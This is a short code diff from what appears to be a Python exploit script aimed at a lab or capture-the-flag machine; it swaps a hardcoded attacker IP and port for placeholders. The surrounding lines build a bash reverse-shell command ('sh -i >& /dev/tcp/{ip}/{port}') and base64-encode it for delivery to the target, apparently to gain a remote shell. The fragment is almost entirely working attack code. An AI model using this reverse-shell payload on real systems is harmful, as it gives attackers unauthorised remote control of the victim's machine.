@@ -15,8 +15,8 @@ def send_request(url):
 
 def main():
     target = "http://10.10.11.80:8080"
-    ip = "10.10.14.188"
-    port = "4443"
+    ip = "{ip}"
+    port = "{port}"
 
     revshell = f"bash -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
     b64_revshell = base64.b64encode(revshell.encode()).decode()
